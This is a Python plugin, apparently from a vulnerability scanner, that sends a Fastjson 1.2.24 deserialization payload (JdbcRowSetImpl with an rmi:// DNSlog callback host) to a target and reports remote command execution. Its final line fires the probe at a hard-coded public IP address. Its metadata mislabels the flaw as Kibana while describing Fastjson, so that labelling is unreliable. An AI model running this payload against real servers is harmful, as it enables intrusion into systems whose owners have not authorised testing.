#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
import requests
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,Dnslog
import json
requests.packages.urllib3.disable_warnings()
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-12-4"  # 插件编辑时间
        self.info['disclosure'] = '2017-3-15'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "KibanaRemoteCommandExecutionVulnerability"  # 插件名称
        self.info['name'] ='Kibana远程命令执行漏洞' #漏洞名称
        self.info['affects'] = "Fastjson"  # 漏洞组件
        self.info['desc_content'] = "fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "Fastjson<=1.2.24"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Kibana版本"  # 修复建议
        self.info['details'] = Medusa  # 结果


def medusa(Url, RandomAgent, ProxyIp=None):
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload_url = scheme + '://' + url + ':' + str(port)
        DL=Dnslog()
        data = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "rmi://" + DL.dns_host() + "//Exploit",
                "autoCommit": True
            }
        }
        data = json.dumps(data)
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/json',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate"
        }
        resp = requests.post(payload_url, headers=headers, data=data, timeout=10, verify=False)
        if DL.result() and resp.status_code==500:
            Medusa = "{}存在Kibana远程命令执行漏洞\r\n 验证数据:\r\n漏洞位置:{}\r\n返回数据:{}\r\nDNSlong:{}\r\n".format(url,
                                                                                                          payload_url,
                                                                                                          resp.text,DL.dns_host())
            _t = VulnerabilityInfo(Medusa)
            web = VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名

medusa("http://18.217.6.65:8090/","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36")